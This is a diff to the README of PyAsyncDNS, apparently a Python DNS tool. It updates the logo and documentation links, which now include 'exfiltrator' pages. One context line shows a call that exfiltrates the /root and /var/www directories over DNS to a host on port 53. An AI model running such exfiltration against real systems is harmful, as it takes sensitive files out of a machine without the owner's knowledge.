@@ -1,4 +1,4 @@
-![PyAsyncDNS Logo](https://mauricelambert.github.io/info/python/security/PyAsyncDNS_small.png "PyAsyncDNS logo")
+![PyAsyncDNS Logo](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/PyAsyncDNS_small.png "PyAsyncDNS logo")
 
 # PyAsyncDNS
 
@@ -90,9 +90,12 @@ run(exfiltrate_directories(['/root', '/var/www/'], "127.0.0.1", 53)) # exfiltrat
 
  - [Pypi](https://pypi.org/project/PyAsyncDNS)
  - [Github](https://github.com/mauricelambert/PyAsyncDNS)
- - [Documentation](https://mauricelambert.github.io/info/python/security/PyAsyncDNS.html)
- - [Python executable](https://mauricelambert.github.io/info/python/security/PyAsyncDNS.pyz)
- - [Python Windows executable](https://mauricelambert.github.io/info/python/security/PyAsyncDNS.exe)
+ - [Documentation client](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/client.html)
+ - [Documentation server](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/server.html)
+ - [Documentation exfiltrator](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/exfiltrator.html)
+ - [Documentation exfiltrator server](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/exfiltrator_server.html)
+ - [Python executable](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/PyAsyncDNS.pyz)
+ - [Python Windows executable](https://mauricelambert.github.io/info/python/security/PyAsyncDNS/PyAsyncDNS.exe)
 
 ## License
 
